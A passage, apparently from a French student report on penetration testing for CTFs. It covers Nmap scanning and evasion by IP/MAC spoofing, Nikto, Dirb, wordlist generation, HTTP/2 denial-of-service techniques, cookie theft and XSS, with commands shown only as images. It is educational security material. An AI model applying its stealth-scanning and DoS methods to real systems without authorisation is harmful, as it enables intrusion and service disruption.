+Si vous souhaitez obtenir des informations concerant le serveur de déployement du service afin de trouver des failles associées, il vous faudra utiliser l’option -sV de Nmap visualisable en <strong>figure <a href="#fig:sv" data-reference-type="ref" data-reference="fig:sv">2.16</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nmap/-sV.PNG" alt="Scan de version" id="fig:sv" style="width:80.0%" /><figcaption>Scan de version<span label="fig:sv"></span></figcaption>
+</figure>
+<p>Ce scan affiche une nouvelle colonne qui contient les informations du service. Regardons ce qu’il se passe au niveau de Wireshark en <strong>figure <a href="#fig:svwire" data-reference-type="ref" data-reference="fig:svwire">2.17</a></strong>.</p>
+<figure>
+<img src="oui/images/nmap/Wireversion.PNG" alt="Obtention d’informations de version sous Wireshark" id="fig:svwire" style="width:100.0%" /><figcaption>Obtention d’informations de version sous Wireshark<span label="fig:svwire"></span></figcaption>
+</figure>
+<p>Dans un premier temps, nous retrouvons bien la demi-ouverture de port puis Nmap effectue le 3-way Handshake afin de se connecter au service qui est ici HTTP. Il va ensuite aller chercher dans son dictionnaire nmap-service-probes les requêtes à effectuer afin d’obtenir des informations. Dans notre cas, il va commencer par effectuer un GET et obtenir une réponse dans le HTTP/1.1 200 OK. Cela signifie que la page existe et que son retour est positif. Par exemple, si nous avions ouvert la réponse envoyée par la cible, nous aurions vu tout le contenu HTML de la page. Cette réponse est donc comparée à des expressions régulières présentes dans le fichier nmap-service-probes. Ce type de scan est donc plus approprié afin de trouver des failles. Cependant, il existe un moyen beaucoup plus complexe et complet qui est le scan via script.<br />
+<strong>Scan par script</strong><br />
+Dans le but d’obtenir des informations très précises, Nmap peut aussi s’éxecuter avec l’aide de scripts. Cette méthode s’appelle "Nmap Scripting Engine" ou NSE et s’appuie donc sur les mécanismes de Nmap et sur la légèreté des scripts Lua. Le langage Lua est très présent dans le monde du réseau comme par exemple dans Wireshark, dans les routeurs Cisco et d’autres. Nmap contient dans son répertoire près de 601 scripts regroupés sous 139 catégories. Il est donc tout à fait possible de créer un script et de l’excécuter avec Nmap. Cependant, nous allons nous baser sur un script déjà fait et qui exécute plusieurs scripts de différentes catégories afin d’obtenir des réponses précises et variées. Ce script est l’option par défault choisi par Nmap lors de la présence de l’argument -sC comme indiqué sur la <strong>figure <a href="#fig:nse" data-reference-type="ref" data-reference="fig:nse">2.18</a></strong>.<br />
+</p>
+<figure>
+<img src="oui/images/nmap/scriptscan.PNG" alt="NSE par défaut" id="fig:nse" style="width:80.0%" /><figcaption>NSE par défaut<span label="fig:nse"></span></figcaption>
+</figure>
+<p>On s’aperçoit que la quantité d’informations est très importante. Ce type de scan est le moyen ultime pour récupérer le plus d’informations possible. Il sera donc à privilégier lors d’un CTF.<br />
+</p>
+<p><strong>Devenir invisible</strong><br />
+Avoir des informations, c’est bien, mais les récupérer en étant discret, c’est mieux. En effet, si la machine cible n’était pas un CTF mais un cas réel d’attaque, il nous faudrait apprendre à ne pas être détécté. Il existe de multiples moyens que nous allons voir ici. Dans un premier temps, il faut savoir que Nmap utilise l’option -sS par défaut. Ce mode permet à Nmap de ne réaliser qu’une demi-ouverture de porte. Cet option est essentielle afin de ne pas être détecté trop vite. Ensuite, nous avons la possiblité d’usurper notre identité via un spoof MAC et IP comme on peut le voir sur la <strong>figure <a href="#fig:spoofip" data-reference-type="ref" data-reference="fig:spoofip">2.19</a></strong><br />
+</p>
+<figure>
+<img src="oui/images/nmap/spoof.PNG" alt="Spoof MAC et IP" id="fig:spoofip" style="width:100.0%" /><figcaption>Spoof MAC et IP<span label="fig:spoofip"></span></figcaption>
+</figure>
+<p>Cette méthode consiste à se faire passer pour quelqu’un du réseau via son adresse MAC et IP. L’option -g permet d’indiquer vers quel port de la machine usurpée Nmap va rediriger les échanges. L’option -e indique sur quelle interface réseau la machine attaquante va recevoir les informations telles que l’attaque "Man in the middle". Enfin, l’option -Pn n’est pas obligatoire mais elele est conseillée par Nmap en cas d’usurpation d’identité. En effet, cette option permet de bloquer le protocole ICMP et ainsi de ne pas être découvert.<br />
+La seconde méthode permet d’être moins visible vis à vis d’un firewall et de cibler les ports les plus connus tout en réduisant le temps de scan de ports. En moyenne, la durée d’un scan par défaut de Nmap est de 1 seconde. Il est possible de faire varier le temps d’un scan afin de faire baisser le nombre d’ouverture de ports par seconde en utilisant l’argument -Tx. Il est à notifier que le x est comprit entre 0 et 5 et que plus le x sera grand, plus le scan sera agressif.<br />
+</p>
+<p>Cependant, si on recherche à être discret et que l’on choisit un x valant 1 ou 0, le scan risque d’être très long... En effet, l’option -T1 réalise le scan en 30 secondes minimum tandis que le -T0 le réalise en 10 minutes ! La solution la plus adaptée est donc de cibler des ports stratégiques avec l’argument -p comme indiqué dans la <strong>figure <a href="#fig:port" data-reference-type="ref" data-reference="fig:port">2.20</a></strong>.<br />
+</p>
+<figure>
+<img src="oui/images/nmap/t1.PNG" alt="Ciblage des ports" id="fig:port" style="width:100.0%" /><figcaption>Ciblage des ports<span label="fig:port"></span></figcaption>
+</figure>
+<p>Nous avons donc compris dans cette partie que l’outil Nmap est essentiel lors d’une attaque et qu’il comporte énormément de fonctionnalités.</p>
+<p>Nikto est un outil écrit en Perl permettant le scan de vulnérabiltés sur un serveur Web. Il permet de tester la sécurité de la configuration d’un serveur web (les options HTTP, les index, les potentielles failles XSS, injections SQL etc…).<br />
+Avant de montrer ce que peut réaliser Nikto, nous pouvons dans un premier temps revoir comment fonctionne une requête Web. Parmis les ports réservés, les serveurs Web utilise le port 80 pour HTTP et le port 443 pour l’HTTPS. Pour comprendre le fonctionnement, nous allons analyser un échange entre un client et un serveur sur la <strong>figure <a href="#fig:webdiag" data-reference-type="ref" data-reference="fig:webdiag">2.21</a></strong>.<br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/wEBDiagram.png" alt="Échange entre un navigateur et un serveur Web" id="fig:webdiag" style="width:70.0%" /><figcaption>Échange entre un navigateur et un serveur Web<span label="fig:webdiag"></span></figcaption>
+</figure>
+<p>Comme on peut le voir, le schéma sur la <strong>figure <a href="#fig:webdiag" data-reference-type="ref" data-reference="fig:webdiag">2.21</a></strong>. ainsi que la capture wireshark en <strong>figure <a href="#fig:niktowire" data-reference-type="ref" data-reference="fig:niktowire">2.22</a></strong> montrent l’échange minimal entre un navigateur et un serveur Web afin d’obtenir une page HTML via HTTP. Une page Web utilse le protocole TCP pour transmettre les paquets. En effet, lorsque nous chargeons une page Web, nous la voulons complète et sans erreurs. C’est pourquoi le protocole TCP existe. Au début de chaque trame TCP, il ya une synchronisation de la connexion avec le "3 way handshakes". Passons maintenant à la couche applicative : les envois HTTP sont directement émis par le navigateur et par le serveur Web. Ici, c’est notre navigateur qui fait une requête GET au serveur pour obtenir l’ensemble de la page Web voulue. Il existe plusieurs types de requêtes Web (GET, POST, HEAD, ...) mais seul le GET va nous intéresser car il est le plus utilisé.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/wireshark1.PNG" alt="Capture Wireshark d’un scan nikto" id="fig:niktowire" style="width:70.0%" /><figcaption>Capture Wireshark d’un scan nikto<span label="fig:niktowire"></span></figcaption>
+</figure>
+<p>Lors du scan, Nikto est capable de :<br />
+<strong>- Vérifier</strong> si la version du serveur est obsolète ainsi que les logiciels et modules qui sont utilisés par ce dernier.<br />
+<strong>- Scanner</strong> les répertoires, qui peuvent contenir des informations sensibles.<br />
+<strong>- Tester</strong> près de 6000 fichiers potentiellement vulnérables.<br />
+De plus, Nikto supporte les connexions SSL.</p>
+<p>Pour lancer un simple scan, il suffit de taper la commande :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/1.PNG" alt="Scan simple" id="fig:courbe-tikz" style="width:70.0%" /><figcaption>Scan simple<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut remarquer grâce à cette capture wireshark que par défaut, Nikto scanne le port 80 :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/2.PNG" alt="Scan d’un port" id="fig:courbe-tikz" style="width:70.0%" /><figcaption>Scan d’un port<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/wireshark3.png" alt="Mise en évidence du port scanné par défaut par la commande nikto" id="fig:courbe-tikz" style="width:70.0%" /><figcaption>Mise en évidence du port scanné par défaut par la commande nikto<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Afin de scanner un port précis, il faut ajouter l’argument <strong>-p</strong>:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/2.PNG" alt="Scan d’un port" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Scan d’un port<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Dans cette capture, nous venons de scanner l’IP sur le port 80 (http). Il également possible de cibler plusieurs ports en même temps:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/3.PNG" alt="Scan de plusieurs ports" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Scan de plusieurs ports<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>A partir de ces captures, on peut en déduire que Nikto est capable de nous fournir le logiciel qui permet de faire fonctionner le serveur web, sa version et également le système d’exploitation utilisé. En effet, toutes ces informations sont comprises dans l’entête des réponses HTTP du serveur. Nikto est également capable de vérifier les mauvaises configurations de services ou de programmes mal sécurisé. Cet outil propose également des plugins permettant la recherche d’autres vulnérabilités ou de fichier pouvant être intéressant dans un CTF tel que le fichier <strong>robots.txt</strong>. Ce fichier permet le référencement d’un site WEB par les robots de Google. Cependant, l’administrateur peut empêcher le scan de certains répertoires par les robots en précisant dans ce fichier quelques paramètres. Ainsi, grâce à cela, un attaquant peut utiliser ce fichier pour découvrir des répertoires que l’administrateur aurait voulu cacher.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/robots.PNG" alt="Extrait fichier robots.txt" id="fig:courbe-tikz" style="width:50.0%" /><figcaption>Extrait fichier robots.txt<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On comprend à travers cette capture que le paramètre <strong>Disallow</strong> empêche le scan de ce répertoire.<br />
+Une méthode pour gagner en discrétion pendant l’attaque serait d’effectuer un scan par intervalle. En effet, si on effectue un scan toutes les 10 secondes, cela paraîtra moins suspect qu’un scan toutes les 1ms. Cela est possible en ajoutant l’option <strong>-Pause 10</strong> en argument :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/nikto9.png" alt="Ajout de l’argument Pause" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Ajout de l’argument Pause<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Voici une capture wireshark de ce scan avec l’ajout de l’argument :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/wireshark4.PNG" alt="Capture wireshark du scan avec l’otpion de pause" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Capture wireshark du scan avec l’otpion de pause<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On remarque l’utilisation du protocole NTP (Network Time Protocol) qui permet ici de mettre en place le temps de pause.</p>
+<p>Après avoir réalisé un scan via Nmap et repéré qu’un serveur Web est activé, Dirb sera là pour vous guider à travers les pages car il est un scanneur de contenu Web. Son but est de trouver l’existence d’objets web, qu’ils soient cachés ou non. Son fonctionnement réside en la lancée d’une attaque par dictionnaire contre un serveur web et d’en analyser la réponse.<br />
+Cependant, il existe une différence entre une attaque par dictionnaire et une attaque par bruteforce pure.<br />
+Une attaque par dictionnaire est une attaque que l’on utilise dans la cryptanalyse (technique de déduction d’un texte en clair par rapport à un texte chiffré sans la clé de chiffrement) pour justement trouver un mot de passe ou une clé de chiffrement. Son fonctionnement consiste à tester une liste donnée de mots de passe potentiels, un par un, en espérant que le mot de passe de chiffrement soit l’un deux. Cette technique ne marche donc pas systématiquement et il faut une énorme liste de mots de passe et du temps pour qu’elle soit efficace. L’intérêt d’installer des dictionnaires supplémentaires serait utile dans les cas de mots de passe très complexes. C’est d’ailleurs à cause de ce genre d’attaque que l’on conseille de mettre des mots de passe compliqués, car ceux courants sont bien plus simples à trouver avec ce genre d’attaque.</p>
+<p>Comme nous l’avons plus haut, Dirb se base sur un dicitonnaire afin de réaliser son scan. Nous avons donc quatre possibilités :</p>
+<ul>
+<li><p><strong>Créer un dictionnaire à partir d’une page Web</strong></p></li>
+<li><p><strong>Créer un dictionnaire sous forme de pattern</strong></p></li>
+<li><p><strong>Créer un dictionnaire aléatoire</strong></p></li>
+<li><p><strong>Utiliser un dictionnaire présent dans le répertoire de Dirb</strong><br />
+</p></li>
+</ul>
+<p><strong>Créer un dictionnaire à partir d’une page Web</strong><br />
+Cette méthode est plus utilisée avec l’outil John que Dirb mais il est important de l’expliquer ici. En effet, utiliser des mots présents sur une page Web peut être intéressant dans le cas où nous avons un mot de passe hasher à découvrir. Il vous faudra donc télécharger la page Web en question via un wget et réaliser la commande suivante :</p>
+<figure>
+<img src="oui/images/Dirb/html2dic.PNG" alt="Html2dic" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Html2dic<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>C’est ainsi que nous pouvons créer un premier dictionnaire assez rapidement.<br />
+<strong>Créer un dictionnaire sous forme de pattern</strong><br />
+Lorsque que l’on connaît une partie du mot ou page que l’on recherche, utiliser un pattern peut être la solution. Un pattern est une forme commune qui va varier sur une partie pré-définie. Gendict est l’outil de création de dictionnaire avec pattern que nous allons utiliser ici. Il vous faudra cependant l’installer via le paquet "icu-devtools". Voici son utilisation :</p>
+<figure>
+<img src="oui/images/Dirb/gendict.PNG" alt="Gendict -a" id="fig:courbe-tikz" style="width:34.0%" /><figcaption>Gendict -a<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On comprend ici que le X sera la variable du pattern. Il est donc tout à fait possible de créer un dictionnaire sans pattern en mettant un nombre de X correspondant à la taille recherchée comme ceci :</p>
+<figure>
+<img src="oui/images/Dirb/dicoaleatoire.PNG" alt="Gendict -s" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Gendict -s<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>L’option -s permet d’obtenir aussi les majuscules. Les deux principaux défauts de Gendict en tant que créateur de dictionnaires aléatoires sont les suivants :</p>
+<ul>
+<li><p><strong>Le manque de caractères spéciaux</strong></p></li>
+<li><p><strong>La taille est fixe en fonction du nombre de X</strong></p></li>
+</ul>
+<p>C’est pour cette raison qu’il existe un autre outil spécialisé dans la conception de dictionnaires aléatoires.<br />
+<strong>Créer un dictionnaire aléatoire</strong><br />
+L’outil que nous considérons comme le plus efficace en terme de création de dictionnaires aléatoires est l’outil Crunch. Ce dernier, en plus de réaliser du pattern, complète les défauts de Gendict. Nous allons vous présenter la manière pour réaliser le dictionnaire le plus complet possible de manière aléatoire. Tout d’abord, Crunch se base sur un dictionnaire se nommant "charset.lst". Vous y retrouverez les séries de caractères que vous pouvez choisir pour réaliser votre dictionnaire. Dans notre cas, nous avons choisis d’utiliser la série mixalpha-numeric-all-space et nous l’avons enregistré dans un fichier dico.txt comme ci-dessous :</p>
+<figure>
+<img src="oui/images/Dirb/crunch.PNG" alt="Crunch" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Crunch<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Comme vous pouvez le voir au début de la commande, nous avons spécifié que les mots devaient être générés entre 1 et 4 caractères et l’outil nous annonce que le dictionnaire fera 391 MB ! Pour information, les sites Web demandent en général un mot de passe avec au minimum 8 caractères. Je vous laisse donc lire la taille du dictionnaire si l’on souhaitait des mots de 1 à 8 caractères :</p>
+<figure>
+<img src="oui/images/Dirb/crunch2.PNG" alt="Crunch" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Crunch<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Il est donc certain que cet outil vous permettra d’avoir un dictionnaire le plus complet au monde à la seule condition d’avoir une très grosse station de stockage... Heureusement que les concepteurs de Dirb ont pensé à ce détail et nous ont fourni des dictionnaires par défaut.<br />
+<strong>Utiliser un dictionnaire présent dans le répertoire de Dirb</strong><br />
+Comme nous l’avons vu précedemment, créer un dictionnaire peut vite devenir fastidieux. C’est pour cette raison que nous allons nous baser sur les dictionnaires présents dans le répertoire de Dirb. Il en existe plusieurs mais ici, nous allons utiliser le dictionnaire common.txt :</p>
+<figure>
+<img src="oui/images/Dirb/dirb.PNG" alt="Utilisation de Dirb" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Utilisation de Dirb<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Encore une fois, l’utilisation d’un dictionnaire est très personnel. Il vous suffira donc de changer le dictionnaire et de lancer la commande afin d’obtenir un résultat. Comme vos pouvez le voir sur la capture d’écran ci-dessus, Dirb nous donne des pages cachées que nous n’aurions pas forcément trouvé tout seul. Cet outil est donc essentiel lors d’un pentest Web.</p>
+<p>Pour ceux qui préfèrent les interfaces graphiques aux lignes de commandes, il existe l’équivalent de Dirb en GUI (Graphical User Interface) qui se nomme Dirbuster.</p>
+<p>Ce dernier permet, lui aussi, d’attaquer un site par dictionnaire. Il suffit de rentrer l’adresse IP du site ainsi que le répertoire où est stocké la liste de mots visible en <strong>figure <a href="#fig:dirbuster" data-reference-type="ref" data-reference="fig:dirbuster">2.37</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/dirb1.PNG" alt="Dirbuster" id="fig:dirbuster" style="width:80.0%" /><figcaption>Dirbuster<span label="fig:dirbuster"></span></figcaption>
+</figure>
+<p>L’utilisation de Dirb et Dirbuster est fondamentalement la même, mais ils ont chacun leurs avantages.</p>
+<p>Tout d’abord pour la question de rapidité, Dirb est en single-threading alors que Dirbuster est en multi-threading.<br />
+La différence entre single et multi est qu’en single, on ne peut exécuter les tâches qu’une par une de la manière suivante :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/dirb3.PNG" alt="Single-threading" id="fig:courbe-tikz" style="width:25.0%" /><figcaption>Single-threading<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Alors que le multi-threading, lui, permet de faire plusieurs tâches en même temps en ordonnant les tâches en plusieurs threads, de la manière suivante :</p>
+<p><strong>Thread1</strong>:<br />
+</p>
+<p><img src="oui/Ancien/imangeancien/dirb4.PNG" alt="image" style="width:25.0%" /> <span id="fig:courbe-tikz" label="fig:courbe-tikz">[fig:courbe-tikz]</span></p>
+<p><strong>Thread2</strong>:<br />
+</p>
+<p><img src="oui/Ancien/imangeancien/dirb5.PNG" alt="image" style="width:25.0%" /> <span id="fig:courbe-tikz" label="fig:courbe-tikz">[fig:courbe-tikz]</span></p>
+<p><strong>Thread3</strong>:<br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/dirb6.PNG" alt="Multi-threading" id="fig:courbe-tikz" style="width:25.0%" /><figcaption>Multi-threading<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Il faut noter que la différence ne se voit qu’avec des processeurs multi-coeurs, qui peuvent faire plusieurs tâches à la fois.<br />
+Donc pour la rapidité d’exécution, si nous avons un bon processeur, Dirbuster surpasse largement Dirb. Seulement, Dirbuster demande toujours une interaction graphique, alors que Dirb, étant une CLI (Command Line Interface), permet l’automatisation, donc on perd certes du temps sur l’exécution des tâches mais on gagne du temps sur le reste.<br />
+Certes, Dirb vous fournira les fichiers tel que robots.txt mais ne fournira pas le code source des pages. N’hésitez pas à les observer car elles contiennent beaucoup d’informations.</p>
+<h1 id="troisième-partie">Troisième partie</h1>
+<h2 id="lexploitation-des-informations-via-des-failles">L’exploitation des informations via des failles</h2>
+<p>A la suite de la phase de récupération d’informations, nous allons chercher des failles au sein de la machine cible. Certains outils de la précédente étape ont déjà pu nous aiguiller sur le type de failles à exploiter. Nous allons donc vous expliquer dans cette partie quelles sont les principales failles de sécurités que vous pourriez rencontrer et comment les exploiter.</p>
+<p>Actuellement, le déni de services(DoS) ou déni de service distribué (DDoS) est utilisé afin de paralyser un réseau ou un site web pour plusieurs raisons et cela peut vite coûter chère. Cependant, bloquer un service signifie mobiliser du personnel de sécurité afin de résoudre le problème et donc, réduire l’attention sur un autre service qui lui présente des failles permettant une infiltration dans le réseau. Dans ce dossier, nous allons vous parler des DOS basés sur HTTP v2.</p>
+<p>Avant d’expliquer en quoi consiste les failles HTTP v2, nous allons comprendre le fonctionnement de ce protocole.<br />
+Dans l’objectif de gagner en latence et en performance, HTTP v2 a été conçu et a réussi son pari. En effet, cette nouvelle version fait en sorte de réduire le nombre d’échanges entre un client et un serveur via le multiplexage de flux. De cette manière, un simple GET suffit pour obtenir une page Web. En plus de réduire le nombre d’échanges, HTTP v2 va compresser les entêtes HTTP et envoyer des contenus non-demandés qui seront stockés dans le cache (le Push) afin que le client puisse accéder beaucoup plus rapidement aux ressources. Malheureusement, tout ceci a permis l’ouverture au DOS. Nous allons vous en présenter trois qui sont :</p>
+<ul>
+<li><p><strong>Slow Read Attack</strong></p></li>
+<li><p><strong>HPACK Bomb</strong></p></li>
+<li><p><strong>Dependency Cycle Attack</strong></p></li>
+</ul>
+<p>Il en existe d’autres mais ces trois là ont été présentées lors de la Black Hat de 2016 et doivent donc être connues.</p>
+<p>Ce type d’attaque consiste à exploiter le protocole TCP à notre envie. En effet, dans TCP, il y a une "Window" qui consiste à dire au serveur notre capacité en réception de données. Ainsi, si nous réduisons la Window à une toute petite valeur et que nous le reproduisons plusieurs fois en même temps, notre programme va finir par laisser ouvert un certain nombre de sockets et ainsi créer de la latence voire même rendre le site indisponible. Pour effectuer ce DOS, le langage de programmation SCAPY peut être utilisé afin de modifier les requêtes.</p>
+<p>Comme nous l’avons vu plus haut, HTTP v2 compresse les entêtes HTTP sous forme binaire dans le but de gagner en ressource. Ce système se nomme le HPACK. L’attaque HPACK Bomb a pour but d’amplifier la taille du header car elle contient un tableau de taille dynamique ! Ainsi, nous pouvons rajoutons du contenu dans cette partie dynamique pour augmenter sa taille, jusqu’à obtenir la valeur de compression de base qui est de 4KB. Ensuite, grâce au mutliplexage de requêtes on va envoyer ce header 16 mille fois qui est le nombre maximal d’envoi en mutliplexage sur HTTP2. Un calcul rapide nous annonce qu’avec un envoi, le serveur va devoir décompresser 64 MB de données. La décompression comme la compression requièrent beaucoup de ressources au niveau de la RAM. Il ne reste alors plus qu’à faire une boucle en envoyant, en même temps, la plus grosse quantité de requêtes sur ce serveur avec ce header modifié et compressé afin d’effectuer un DOS.</p>
+<p>La nouveauté de HTTP v2 est aussi le fait que le client puisse donner une priorité et un ordre aux éléments qui vont être traités par le serveur. Ce système se nomme "dependency". Chaque ordre a donc un numéro de priorité de ressources qui est associé à un numéro de mémoire. Ainsi, si deux éléments ont le même numéro de mémoire, le processus va reprendre son exécution à partir de ce point et donc créer une boucle infinie. Il est alors tout à fait imaginable de réaliser cette attaque couplée à un HPACK Bomb pour réaliser un très gros DOS.<br />
+Comme vous l’aurez compris, un DOS se base sur la structure des protocoles et peut attirer très vite l’attention de la sécurité informatique ciblé. Ces failles ne sont surtout pas à négliger lors de la réalisation d’une attaque.</p>
+<p>Il est désormais devenu courant de se retrouver face à ce message lorsque l’on souhaite entrer dans un site Web :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/cookie/cookie1.PNG" alt="Utilisation des cookies sur le site Le Parisien" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Utilisation des cookies sur le site Le Parisien<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Cette page nous donne des informations concernant l’utilisation des cookies par le site Web et la possibilité qui nous est permise de pouvoir paramétrer l’utilisation de ces cookies. Force est de constater que la plupart du temps les utilisateurs qui se retrouvent face à cette page ignorent la signification d’un cookie et cliquent immédiatement sur accepter sans prendre le temps de se renseigner sur ce terme. En réalité, un cookie est une donnée envoyée par un serveur Web à votre navigateur. Ces données sont envoyées lorsque vous prenez la décision de visiter un site Web par exemple et cela permet au site en question de garder en mémoire des informations concernant vos habitudes de navigation, vos pseudos, vos mots de passe, vos paniers etc. Ces cookies sont stockés sur votre disque dur en tant que fichier. Ce fichier ne contient que du texte et est donc en principe totalement inoffensif. Malgré cela, certains logiciels antivirus nous mettent en garde contre des cookies provenant de certains sites. En d’autres termes, lorsque vous visitez un site ayant recours à des cookies, vous envoyez des informations à ce site afin qu’il soit en mesure d’améliorer votre expérience en vous proposant des services adaptés à vos centres d’intérêt.</p>
+<p>En règle générale, les cookies peuvent être soit temporaires, soit permanents. Les cookies temporaires sont désignés sous le terme de cookies de sessions et sont utilisés uniquement dans une session. Ces cookies sont supprimés lorsque l’on ferme notre navigateur. Les cookies permanents quant à eux sont utilisés dans différentes sessions de navigation et ils ne disparaissent que lorsque l’on décide de les supprimer ou bien lorsque leur dates d’expirations arrivent à terme. Parmi ces différents types de cookies, il existe les cookies dits internes et les cookies tiers. Les cookies internes sont mis en place par le site que vous consultez. Les cookies tiers quant à eux sont créés par un site différent de celui que vous consultez. Par exemple, de nombreux sites ont un bouton “J’aime” sur lequel on peut cliquer dessus. En cliquant sur ce bouton, un cookie pouvant être utilisé par Facebook s’activera.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/cookie/cookie2.PNG" alt="Transfert des cookies du navigateur au seveur" id="fig:courbe-tikz" style="width:70.0%" /><figcaption>Transfert des cookies du navigateur au seveur<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>1. Le protocole HTTP permet de transférer des pages Web. A l’aide d’une requête HTTP, le navigateur appelle une page provenant du serveur Web. Pour parvenir à la page www.velizy.fr/index.html, le navigateur se connecte au serveur www.velizy.fr en envoyant la requête suivante: GET /index.html HTTP/1.0 Host: www.velizy.fr</p>
+<p>2. Le serveur répond en transmettant au navigateur une réponse HTTP. Cette réponse permet de demander au navigateur de conserver des cookies. Afin de stocker un cookie, le serveur va ajouter dans la réponse HTTP une ligne Set-cookie. Cette ligne est en réalité une requête qui a pour but de demander au navigateur de stocker la chaîne nom=valeur.</p>
+<p>3. Cette chaîne sera par la suite renvoyée dans toutes les prochaines requêtes envoyées au serveur s’il y a existence du cookie. HTTP/1.0 200 OK Content-type: text/html Set-cookie: nom=valeur</p>
+<p>En théorie, tous les cookies ont un nom et une date d’expiration. Lorsque le site Web que vous consultez envoie un cookie, il prend l’initiative de demander à votre navigateur de stocker le cookie en question jusqu’à la date et l’heure inscrits dans le fichier texte. Il existe une loi dans laquelle il est stipulé que les cookies doivent être supprimés au moins une année après leur création. Malgré cela, certains cookies sont conservés bien plus longtemps. Pour l’anecdote, il est à savoir que des cookies ont été créés dans l’optique de durer 7000 ans.</p>
+<p>Comme nous l’avons dit précédemment les cookies sont des données envoyées par un serveur web au navigateur de notre ordinateur. Or, les cookies peuvent contenir des informations que l’on qualifie de sensibles (pseudo, mot de passe). Par conséquent, il serait fort regrettable que quiconque puisse intercepter ces données. Malheureusement, certaines méthodes permettent d’intercepter les cookies et nous allons ici en lister quelques unes. La première méthode que nous allons expliquer se prénomme détournement de session. Cette attaque est essentiellement réalisée dans des lieux publics contenant des espaces WIFI non chiffré. Elle consiste en la lecture des communications d’autres utilisateurs sur le réseau en ayant recours à des "renifleurs de paquets". Cette lecture n’est possible que lorsque le trafic réseau n’est pas chiffré. En d’autres termes, pour éviter cette attaque, il suffit de chiffrer la connexion entre le serveur Web et l’ordinateur de l’utilisateur. Pour cela, on peut utiliser par exemple le protocole HTTPS. La seconde méthode permettant d’intercepter des cookies est l’écriture de script directement dans les sites. Ces scripts ont pour but de demander au navigateur d’envoyer les cookies à des serveurs malveillants. Cette attaque est utilisée sur les sites qui permettent aux utilisateurs de publier du contenu HTML. Pour ce qui est de ce type d’attaque, chiffrer les cookies avant leur envoi sur le réseau n’a pas de grande utilité. En revanche afin de rendre inaccessible un cookie depuis l’exécution d’un script, il est possible d’utiliser le drapeau HttpOnly qui est une option introduite en 2002 sur le navigateur internet explorer.</p>
+<p>Le client d’un site Web n’a pas en sa possession de nombreux moyens permettant d’éviter qu’on intercepte ses cookies. En effet, il ne peut que prendre la décision de désactiver les cookies. Malheureusement, de nombreux sites Web ont recours à des cookies pour fonctionner convenablement.</p>
+<p>Par conséquent, la sécurisation du vol de cookies est essentiellement à la charge du créateur du site Web. Il doit prendre en compte de nombreux détails afin de sécuriser au mieux son site et donc ses clients. Pour cela, le créateur du site Web doit éviter de stocker les données en lien avec l’authentification (pseudo ,mot de passe) en clair, mettre en place des identifiants de session aléatoires lors de chaque requête HTTP, effacer les cookies après leur utilisation. Il doit aussi chiffrer totalement, où au moins partiellement les cookies et surtout avoir recours à des protocoles sécurisés comme HTTPS.</p>
+<p>Une faille XSS est une faille présente sur un site web qui permet l’exécution de code HTML ou JavaScript dans des variables mal protégées. Il ne faut pas confondre les failles XSS avec les failles SQL. En effet, la faille XSS s’exécute côté client sur le navigateur et non pas côté serveur sur une base de données par exemple.<br />
+Il existe deux types de failles XSS:</p>
+<ul>
+<li><p><strong>Failles XSS réfléchies (non permanentes)</strong></p></li>
+<li><p><strong>Failles XSS stockées (permanentes)</strong></p></li>
+</ul>
+<p>Nous verrons au cours de cette section ces deux types de failles, la structure d’une faille XSS ainsi que son utilisation par un pirate.</p>
+<p>La faille XSS non permanente est la faille la plus utilisée et sûrement la plus facile à pratiquer. En effet, l’attaquant n’a qu’à injecter du code dans l’input d’un formulaire et le faire apparaître à l’écran. Cette attaque ne nécessite donc en aucun cas un stockage contrairement au XSS stocké qui est présenté ci-dessous. Cette faille peut par exemple être présente lors de l’intervention d’un champ "rechercher" sur un site:</p>
+<figure>
+<img src="oui/images/xss/xss.PNG" alt="Code HTML recherche" id="fig:courbe-tikz" style="width:60.0%" /><figcaption>Code HTML recherche<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<figure>
